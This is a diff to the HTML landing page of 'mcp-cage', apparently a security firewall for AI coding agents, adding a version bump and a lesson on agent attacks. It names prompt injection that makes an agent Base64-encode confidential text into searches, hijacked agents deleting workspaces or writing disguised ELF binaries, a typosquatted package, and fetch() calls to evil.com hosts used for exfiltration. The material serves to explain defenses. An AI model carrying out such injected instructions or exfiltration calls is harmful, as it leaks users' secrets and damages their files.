@@ -1014,7 +1014,7 @@
     <div class="sticky-nav-inner">
       <div class="brand">
         <span>🛡️ <code>mcp-cage</code></span>
-        <span class="brand-version">v0.4.2</span>
+        <span class="brand-version">v0.4.3</span>
       </div>
       <div class="nav-links">
         <a href="#integration-modes">5 Modes</a>
@@ -1037,7 +1037,7 @@
         <span>·</span>
         <span>100% PYTHON 3.10+ STDLIB</span>
       </div>
-      <h1><code>mcp-cage</code> v0.4.2 — Zero-Code Wire &amp; Native-Hook Security Firewall</h1>
+      <h1><code>mcp-cage</code> v0.4.3 — Zero-Code Wire &amp; Native-Hook Security Firewall</h1>
       <p class="hero-tagline">
         <strong>"Gitleaks + Little Snitch for AI Coding Agents"</strong> — Deterministic, non-bypassable Information-Flow Control (IFC), format-preserving secret scrubbing, 34-mechanism CWE parameter guards, 7-vector Agent Skill &amp; MCP Server AST 0-day scanners (<code>audit-skills</code>, <code>audit-server --format sarif</code>, <code>probe-live</code>), reverse-channel firewall (<code>sampling</code>, <code>roots</code>, <code>elicitation</code>), cross-turn salami-slice exfiltration circuit breaker, SHA-256 hash-chained audit ledger, and OS kernel sandboxing for <strong>Claude Code</strong>, <strong>Cursor</strong>, <strong>OpenAI Codex CLI</strong>, <strong>Google Gemini CLI</strong>, <strong>Google Antigravity (<code>agy</code>)</strong>, and any <strong>Model Context Protocol (MCP)</strong> server.
       </p>
@@ -1234,10 +1234,10 @@ mcp-cage verify-audit --audit-file .mcp-cage/audit.jsonl</pre>
     </section>
 
     <!-- 2A. AI & AGENTIC SECURITY FUNDAMENTALS ACADEMY FOR EVERY AI TOOL USER -->
-    <section id="security-fundamentals" class="section-block" data-sync-version="0.4.2" data-sync-cwe-count="34">
+    <section id="security-fundamentals" class="section-block" data-sync-version="0.4.3" data-sync-cwe-count="34">
       <div class="section-header">
         <div>
-          <div class="section-eyebrow">Interactive Visual Security Guide · Updated with v0.4.2 (34 Empirical CWEs, 7 Skill AST Vectors &amp; 7 MCP Server 0-Day AST Sinks)</div>
+          <div class="section-eyebrow">Interactive Visual Security Guide · Updated with v0.4.3 (34 Empirical CWEs, 7 Skill AST Vectors &amp; 7 MCP Server 0-Day AST Sinks)</div>
           <h2 class="section-title" id="academy-heading">AI &amp; Agentic Security Fundamentals: How Real-World Attacks Happen &amp; How <code>mcp-cage</code> Stops Them</h2>
           <p class="section-subtitle">
             Whether you are an AI power-user, product builder, data scientist, researcher, or developer using tools like Claude, Cursor, Gemini, or ChatGPT, every AI agent shares one fundamental trait: <strong>the AI model cannot reliably tell the difference between your instructions and untrusted text it reads from the outside world</strong>. Start with the visual overview below to see the <strong>4 Key Takeaways at a Glance</strong>, then expand any of the 10 real-world lessons to see how each vulnerability happens and how <code>mcp-cage</code> blocks it automatically.
@@ -1471,11 +1471,11 @@ mcp-cage verify-audit --audit-file .mcp-cage/audit.jsonl</pre>
       <section class="accordion" id="fundamentals-accordion" aria-labelledby="academy-heading">
         <div class="accordion-header-bar">
           <div style="font-size:13.5px; font-weight:700; color:var(--text-bright);">
-            11 Interactive Real-World Lessons (Click Any Lesson or Expand All to Compare Vulnerable Patterns vs. <code>mcp-cage</code> Protection)
+            12 Interactive Real-World Lessons (Click Any Lesson or Expand All to Compare Vulnerable Patterns vs. <code>mcp-cage</code> Protection)
           </div>
           <button type="button" class="toggle-all-btn" commandfor="fundamentals-accordion" command="--toggle-all" aria-expanded="false">
-            <span class="expand">Expand all 11 lessons</span>
-            <span class="collapse">Collapse all 11 lessons</span>
+            <span class="expand">Expand all 12 lessons</span>
+            <span class="collapse">Collapse all 12 lessons</span>
           </button>
         </div>
 
@@ -2100,7 +2100,7 @@ parameters and cap repetitive zero-progress tool retries.</pre>
                 <text x="20" y="99" fill="#fde68a" font-size="9.5" font-family="monospace">4. 3rd-Party Server: @mcp.tool() flows into <tspan fill="#f87171">subprocess(shell=True)</tspan></text>
 
                 <rect x="466" y="8" width="446" height="100" rx="8" fill="#042f2e" stroke="#10b981" stroke-width="1.2"/>
-                <text x="478" y="27" fill="#6ee7b7" font-size="11" font-weight="800">🛡️ WITH mcp-cage v0.4.2 (Reverse Firewall, Ledger &amp; 0-Day AST Hunter)</text>
+                <text x="478" y="27" fill="#6ee7b7" font-size="11" font-weight="800">🛡️ WITH mcp-cage v0.4.3 (Reverse Firewall, Ledger &amp; 0-Day AST Hunter)</text>
                 <text x="478" y="46" fill="#a7f3d0" font-size="10">• Blocks <tspan fill="#fcd34d" font-family="monospace">elicitation</tspan> phishing, <tspan fill="#fcd34d" font-family="monospace">roots/list</tspan> &amp; strips Markdown image beacons</text>
                 <text x="478" y="64" fill="#a7f3d0" font-size="10">• <tspan fill="#6ee7b7" font-family="monospace">domain_egress_ledger</tspan> concatenates cross-turn slices &amp; trips breaker</text>
                 <text x="478" y="82" fill="#a7f3d0" font-size="10">• Propagates taint to subagents &amp; chains <tspan fill="#6ee7b7" font-family="monospace">audit.jsonl</tspan> via SHA-256</text>
@@ -2125,7 +2125,7 @@ Turn 1: fetch("https://a1b2c3d4e5.evil.com/p")
 Turn 2: fetch("https://f60718293a.evil.com/p")</pre>
               </div>
               <div class="academy-panel cage">
-                <div class="academy-panel-title" style="color:var(--green);">🛡️ 3. How mcp-cage v0.4.2 Stops &amp; Hunts It</div>
+                <div class="academy-panel-title" style="color:var(--green);">🛡️ 3. How mcp-cage v0.4.3 Stops &amp; Hunts It</div>
                 <pre class="code-box" style="min-height:115px; font-size:11.5px;">1. `mcp-cage audit-server . --format sarif` &amp; `probe-live`
    detect all 7 server 0-day sink vectors + CWE-209 oracles!
 2. `domain_egress_ledger` blocks cross-turn salami-slicing.
@@ -2137,6 +2137,63 @@ Turn 2: fetch("https://f60718293a.evil.com/p")</pre>
                 <pre class="code-box" style="min-height:115px; font-size:11.5px;">mcp-cage audit-server ./my-mcp-server --format sarif
 mcp-cage probe-live -- python3 ./my-mcp-server/server.py
 mcp-cage verify-audit --audit-file .mcp-cage/audit.jsonl</pre>
+              </div>
+            </div>
+          </div>
+        </details>
+
+        <details>
+          <summary>Lesson 12 · Zero-Leak Child Env Jail, Multi-Encoding Shingle DLP, Honeytoken Tripwires, 0-Day Virtual Patching (`--auto-patch`) &amp; Transactional Workspace Rollback (`v0.4.3`)</summary>
+          <div class="details-inner">
+            <p>
+              <strong>How this happens in everyday AI tool use:</strong> Even when basic arguments are checked, five next-generation attack vectors can hit an AI workspace: (1) <strong>Ambient Environment Theft &amp; Package Typosquatting:</strong> When your IDE spawns a community MCP server, it normally inherits your entire terminal <code>os.environ</code> (leaking <code>AWS_SECRET_ACCESS_KEY</code>, <code>ANTHROPIC_API_KEY</code>, <code>GITHUB_TOKEN</code> in memory), or runs a typosquatted package like <code>@modelcontextprotocol/server-filesysten</code>; (2) <strong>Base64 / Reversed / ROT13 Confidential Document Exfiltration:</strong> A prompt injection tells the AI to Base64-encode or reverse a paragraph of a confidential strategy doc (which has no API key prefix) and send it in a search query; (3) <strong>Silent Credential Hunting:</strong> A poisoned skill searches for <code>.env</code> keys; (4) <strong>Half-Finished Tainted File Edits:</strong> An agent gets hijacked mid-refactor and backdoors <code>app.py</code> before getting blocked on step 5; and (5) <strong>Unpatched 3rd-Party MCP Server 0-Days:</strong> You discover a 0-day in a vendor MCP server you cannot edit directly.
+            </p>
+            <div style="overflow-x:auto; margin:10px 0 12px; background:#090e1a; border:1px solid var(--border); border-radius:8px; padding:10px;">
+              <svg viewBox="0 0 920 120" width="100%" style="min-width:680px; max-height:124px; display:block;" role="img" aria-label="Lesson 12 diagram showing SubprocessEnvJail, Multi-Encoding Shingle DLP, Honeytoken Canary Tripwires, 0-Day Virtual Patching, and Transactional Workspace Rollback">
+                <rect x="8" y="8" width="438" height="104" rx="8" fill="#1f090d" stroke="#ef4444" stroke-width="1.2"/>
+                <text x="20" y="27" fill="#fca5a5" font-size="11" font-weight="800">❌ WITHOUT mcp-cage v0.4.3 (Env Leaks, Base64 Exfil &amp; Tainted Edits)</text>
+                <text x="20" y="46" fill="#fde68a" font-size="9.5" font-family="monospace">1. Child Env Leak:  Community MCP reads <tspan fill="#f87171" font-weight="700">os.environ["AWS_SECRET_KEY"]</tspan></text>
+                <text x="20" y="64" fill="#fde68a" font-size="9.5" font-family="monospace">2. Encoded DLP:     LLM Base64-encodes M&amp;A doc excerpt -&gt; <tspan fill="#f87171">web_search(q=b64)</tspan></text>
+                <text x="20" y="82" fill="#fde68a" font-size="9.5" font-family="monospace">3. Tainted File:    Hijacked agent modifies <tspan fill="#f87171">app.py</tspan> before egress block</text>
+                <text x="20" y="100" fill="#fde68a" font-size="9.5" font-family="monospace">4. Vendor 0-Day:    3rd-party MCP has <tspan fill="#f87171">CWE-78</tspan> in custom param</text>
+
+                <rect x="466" y="8" width="446" height="104" rx="8" fill="#042f2e" stroke="#10b981" stroke-width="1.2"/>
+                <text x="478" y="27" fill="#6ee7b7" font-size="11" font-weight="800">🛡️ WITH mcp-cage v0.4.3 (13 Next-Gen &amp; First-in-Industry Defenses)</text>
+                <text x="478" y="46" fill="#a7f3d0" font-size="10">• <tspan fill="#6ee7b7" font-family="monospace">SubprocessEnvJail</tspan> scrubs ambient secrets &amp; flags Damerau typosquats</text>
+                <text x="478" y="64" fill="#a7f3d0" font-size="10">• 24-char <tspan fill="#fcd34d" font-family="monospace">SHA-256 shingles</tspan> catch Base64/Hex/Reversed/ROT13 doc exfil</text>
+                <text x="478" y="82" fill="#a7f3d0" font-size="10">• <tspan fill="#6ee7b7" font-family="monospace">plant-canaries</tspan> tripwires + <tspan fill="#6ee7b7" font-family="monospace">mcp-cage rollback</tspan> restores pre-images!</text>
+                <text x="478" y="100" fill="#34d399" font-size="10" font-weight="800">• `audit-server --auto-patch` compiles live wire virtual patches!</text>
+              </svg>
+            </div>
+            <div class="academy-lesson-grid">
+              <div class="academy-panel vuln">
+                <div class="academy-panel-title" style="color:var(--red);">❌ 1. Multi-Encoding &amp; Supply-Chain Risk</div>
+                <pre class="code-box" style="min-height:115px; font-size:11.5px;"># 1. Typosquat in .mcp.json:
+"args": ["-y", "@modelcontextprotocol/server-filesysten"]
+# 2. LLM Base64-encodes confidential doc excerpt:
+b64 = base64.b64encode(b"acquisition target: Acme")</pre>
+              </div>
+              <div class="academy-panel attack">
+                <div class="academy-panel-title" style="color:var(--amber);">💥 2. Polyglot Smuggling &amp; Intent Drift</div>
+                <pre class="code-box" style="min-height:115px; font-size:11.5px;">// 1. User asked: "Explain how auth.py works" (READ_ONLY)
+//    Hijacked AI calls: delete_workspace_safely("prod")
+// 2. Or writes an ELF binary disguised as notes.txt:
+write_file("notes.txt", "\x7fELF...binary_payload")</pre>
+              </div>
+              <div class="academy-panel cage">
+                <div class="academy-panel-title" style="color:var(--green);">🛡️ 3. How mcp-cage v0.4.3 Stops &amp; Reverses It</div>
+                <pre class="code-box" style="min-height:115px; font-size:11.5px;">1. `SubprocessEnvJail` strips ambient `os.environ` keys.
+2. Multi-Encoding Shingle DLP decodes Base64/Hex/ROT13/Rev.
+3. `polyglot_and_magic_byte_guard` blocks ELF/PE/SVG-XSS.
+4. `Zero-LLM Intent Drift` blocks unrequested mutations.
+5. `mcp-cage rollback` restores tainted file pre-images!</pre>
+              </div>
+              <div class="academy-panel fix">
+                <div class="academy-panel-title" style="color:var(--cyan);">🔧 4. Practical v0.4.3 CLI Commands</div>
+                <pre class="code-box" style="min-height:115px; font-size:11.5px;">mcp-cage audit-server ./srv --auto-patch .mcp-cage/policy.json
+mcp-cage plant-canaries --decoy-file .env.canary
+mcp-cage rollback --db .mcp-cage/taint.db
+mcp-cage inspect-audit --format html --output report.html</pre>
               </div>
             </div>
           </div>
@@ -2931,7 +2988,7 @@ mcp-cage verify-audit --audit-file .mcp-cage/audit.jsonl</pre>
 
     <footer>
       <div>
-        <strong><code>mcp-cage</code> v0.4.2</strong> · Built by <a href="https://github.com/nagarajulu" target="_blank" rel="noopener">Nagarajulu (Naga) Aerakoni</a> · Senior Software Engineer @ Amazon &amp; Agentic Systems Security Researcher
+        <strong><code>mcp-cage</code> v0.4.3</strong> · Built by <a href="https://github.com/nagarajulu" target="_blank" rel="noopener">Nagarajulu (Naga) Aerakoni</a> · Senior Software Engineer @ Amazon &amp; Agentic Systems Security Researcher
       </div>
       <div>
         <a href="https://github.com/nagarajulu/mcp-cage" target="_blank" rel="noopener">GitHub Repository</a> ·
